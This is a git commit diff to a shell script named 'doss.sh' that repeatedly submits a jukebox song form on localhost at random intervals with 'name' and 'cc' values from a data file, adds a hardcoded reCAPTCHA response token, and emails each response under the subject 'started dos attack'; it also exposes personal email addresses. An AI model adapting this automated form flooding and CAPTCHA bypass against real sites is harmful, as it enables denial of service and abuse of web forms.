f65dea72c158ca05c70b36c72ae059b4237b5aec
Nikhil <akhilvallabh@gmail.com>
2021-11-20 18:34:05 -0800

    send email for cronjob

--- dass-attk/doss.sh
+++ dass-attk/doss.sh
@@ -11,9 +11,11 @@ end_time=25
 RANDOM=$$
 
 
-cat data.txt | while read name cc
+cat /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/data.txt | while read name cc
 do
    sleep_time=`random $start_time $end_time`
    sleep $sleep_time 
-   wget "http://localhost:8000/cgi-bin/form_get.py?Song=${name}&cc=${cc}&submit=Submit"
+   /usr/local/bin/wget "http://localhost:8000/cgi-bin/form_get.py?Song=${name}&g-recaptcha-response=03AGdBq26&cc=${cc}&submit=Submit" > /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/${name}.html
+   
+  uuencode /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/${name}.html | mail -s "started dos attack"  priyamuchandikar@gmail.com
 done
